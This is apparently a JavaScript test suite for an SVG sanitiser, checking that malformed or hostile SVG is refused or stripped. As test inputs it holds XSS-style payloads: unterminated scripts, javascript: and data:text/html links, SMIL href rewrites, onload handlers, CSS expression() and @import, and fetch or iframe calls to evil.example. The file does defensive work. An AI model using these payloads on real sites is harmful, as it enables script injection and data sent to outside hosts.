// @ts-check
// The SVG sanitiser (design/svg-sanitize.mjs), folded in at the C3 fix pass.
//
// The five cases below are the ones that walked through the regex scrub that used to live in
// graph/parts/render.mjs, each with `removed === []` — and this is not a containment question:
// Render(svg) → File('out/x.svg') writes these bytes into the thread's project, and the reader
// opens them in a browser that has none of the guest's CSP. A shape that survives here is a file
// that executes and phones home on someone's desktop.
//
// The rule the module enforces: a document we could not PARSE is refused, not patched, and a tag
// or attribute we did not understand does not travel.

import assert from 'node:assert/strict';

import {
  sanitizeSvg, parseXml, filterCss, localRef, serialize,
} from '../../../renderer/chat/design/svg-sanitize.mjs';
import { sanitizeSvg as sanitizeFromRender } from '../../../renderer/chat/graph/parts/render.mjs';

/** @param {string} s @returns {string} */
const bare = (s) => String(s).replace(/\s+/g, '').toLowerCase();

export default (test) => {
  test('the five shapes that walked through the old regex scrub are all stopped', () => {
    // 1. an unterminated <script>: every delete-the-tag regex needed a closing tag, but a parser
    //    runs an unclosed script to end of file.
    const a1 = sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)');
    assert.equal(a1.ok, false, 'an unterminated script is not a picture');
    assert.equal(a1.svg, '');

    // 2. an UNQUOTED attribute value: the reference rule only matched quotes.
    const a2 = sanitizeSvg('<svg><a href=data:text/html,x>x</a></svg>');
    assert.equal(a2.ok, false, 'an unquoted value is not well-formed XML');

    // 3. SMIL, which the scrub never modelled: <set> rewrites href at animation time.
    const a3 = sanitizeSvg('<svg><a><set attributeName="href" to="data:text/html,x"/></a></svg>');
    assert.equal(a3.ok, true);
    assert.ok(!/<set/i.test(a3.svg), a3.svg);
    assert.ok(!/data:text/i.test(a3.svg), 'and the payload goes with it');
    assert.deepEqual(a3.removed, ['animation'], 'and it is REPORTED, not silently dropped');

    // 4. @import: a NETWORK fetch the url(...) rule could not see. LOCAL ONLY means this one
    //    matters even when nothing executes.
    const a4 = sanitizeSvg('<svg><style>@import "http://evil.example/x.css";</style><rect width="4" height="4"/></svg>');
    assert.equal(a4.ok, true);
    assert.ok(!/@import/i.test(a4.svg), a4.svg);
    assert.ok(!/evil\.example/.test(a4.svg), 'no external stylesheet survives');
    assert.deepEqual(a4.removed, ['reference']);

    // 5. an unterminated <foreignObject>, carrying an iframe.
    const a5 = sanitizeSvg('<svg><foreignObject><iframe src="http://evil.example/">');
    assert.equal(a5.ok, false);
    assert.equal(a5.svg, '');
  });

  test('render.mjs sanitises through the same module — the file it writes is the sanitised one', () => {
    const dirty = '<svg xmlns="http://www.w3.org/2000/svg"><style>@import "http://evil.example/x.css";</style><script>fetch("http://evil.example/")</script>';
    assert.equal(sanitizeFromRender(dirty).ok, false, 'unterminated: refused at the part, so no file is written');
    const closed = `${dirty}</svg>`;
    const clean = sanitizeFromRender(closed);
    assert.equal(clean.ok, true);
    assert.ok(!/evil\.example/.test(clean.svg), clean.svg);
    assert.ok(!/<script/i.test(clean.svg));
  });

  test('a picture keeps everything that draws it', () => {
    const src = [
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" width="10" height="10">',
      '<defs><linearGradient id="g"><stop offset="0" stop-color="#f00"/></linearGradient></defs>',
      '<rect width="10" height="10" fill="url(#g)" stroke-width="0.5" style="opacity:0.5"/>',
      '<use href="#g"/><image href="data:image/png;base64,AA"/>',
      '<text x="1" y="2" font-family="Inter" text-anchor="middle">hi &amp; bye</text>',
      '</svg>',
    ].join('');
    const clean = sanitizeSvg(src);
    assert.equal(clean.ok, true);
    assert.deepEqual(clean.removed, [], 'a clean picture loses nothing');
    assert.ok(clean.svg.includes('fill="url(#g)"'), 'a same-document paint reference survives');
    assert.ok(clean.svg.includes('linearGradient'), clean.svg);
    assert.ok(clean.svg.includes('data:image/png;base64,AA'), 'an inline picture survives');
    assert.ok(clean.svg.includes('hi &amp; bye'), 'text is re-escaped, never re-injected');
  });

  test('references may only point inside the document or carry the picture inline', () => {
    assert.equal(localRef('#star'), true);
    assert.equal(localRef('data:image/png;base64,AA'), true);
    assert.equal(localRef('data:image/svg+xml,<svg/>'), false, 'a nested SVG is another document');
    assert.equal(localRef('https://example.com/a.png'), false);
    assert.equal(localRef(' # star'.replace(' ', '')), true);
    // whitespace inside a scheme is how the old rule was fooled
    assert.equal(localRef('java\tscript:alert(1)'), false);
    const clean = sanitizeSvg('<svg><a href="java\tscript:alert(1)"><text>x</text></a></svg>');
    assert.ok(!/script:/i.test(clean.svg), clean.svg);
    assert.ok(clean.svg.includes('<text>x</text>'), 'the words stay, the link goes');
  });

  test('a document that is not well-formed is refused with a reason, not patched', () => {
    for (const bad of [
      'not an svg',
      '<svg><rect></svg>',                       // mismatched end tag
      '<svg><rect width=4/></svg>',              // unquoted
      '<html><body>hi</body></html>',            // a root that is not <svg>
      '<svg><g>',                                // unterminated
    ]) {
      const out = sanitizeSvg(bad);
      assert.equal(out.ok, false, bad);
      assert.equal(out.svg, '', bad);
      assert.ok(typeof out.error === 'string' && out.error.length > 0, `a reason for: ${bad}`);
    }
  });

  test('a DOCTYPE and a CDATA section are dropped and named', () => {
    const doc = sanitizeSvg('<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://x/svg11.dtd">'
      + '<svg width="4" height="4"><rect width="4" height="4"/></svg>');
    assert.equal(doc.ok, true);
    assert.deepEqual(doc.removed, ['doctype']);
    assert.ok(!/DOCTYPE/i.test(doc.svg), doc.svg);

    const cdata = sanitizeSvg('<svg><title><![CDATA[<script>alert(1)</script>]]></title></svg>');
    assert.equal(cdata.ok, true);
    assert.deepEqual(cdata.removed, ['cdata']);
    assert.ok(!/alert/.test(cdata.svg), cdata.svg);
  });

  test('handlers, unknown elements and unknown attributes all go, by name', () => {
    const out = sanitizeSvg('<svg onload="alert(1)"><rect width="4" height="4" formaction="x"/><iframe/></svg>');
    assert.equal(out.ok, true);
    assert.equal(bare(out.svg).includes('onload'), false);
    assert.equal(bare(out.svg).includes('iframe'), false);
    assert.equal(bare(out.svg).includes('formaction'), false);
    assert.deepEqual(out.removed.slice().sort(), ['attribute', 'element', 'handler']);
  });

  test('a namespace declaration we do not know does not travel', () => {
    const out = sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg" xmlns:e="http://evil.example/ns"><rect width="1" height="1"/></svg>');
    assert.equal(out.ok, true);
    assert.ok(out.svg.includes('xmlns="http://www.w3.org/2000/svg"'), out.svg);
    assert.ok(!/evil\.example/.test(out.svg), out.svg);
    assert.deepEqual(out.removed, ['reference']);
  });

  test('filterCss keeps a local url() and refuses everything else', () => {
    assert.deepEqual(filterCss('fill:url(#g);opacity:.5'), { css: 'fill:url(#g);opacity:.5', removed: [] });
    const net = filterCss('background:url(http://evil.example/x.png)');
    assert.ok(!/evil\.example/.test(net.css), net.css);
    assert.deepEqual(net.removed, ['reference']);
    assert.deepEqual(filterCss('@import url("http://evil.example/x.css");').css.trim(), '');
    assert.equal(filterCss('width:expression(alert(1))').removed[0], 'handler');
    // a url( the rule cannot parse takes the whole block with it rather than shipping unread
    assert.equal(filterCss('fill:url( "http://evil.example/x" ;').css, '');
  });

  test('the parser answers with a tree that serialises back to markup we wrote', () => {
    const p = parseXml('<svg><g id="a"><rect/></g></svg>');
    assert.equal(p.ok, true);
    if (!p.ok) return;
    assert.equal(p.root.name, 'svg');
    assert.equal(p.root.children.length, 1);
    assert.equal(serialize(p.root), '<svg><g id="a"><rect/></g></svg>');
    const deep = parseXml(`<svg>${'<g>'.repeat(80)}${'</g>'.repeat(80)}</svg>`);
    assert.equal(deep.ok, false, 'a document nested past MAX_DEPTH is refused');
  });
};
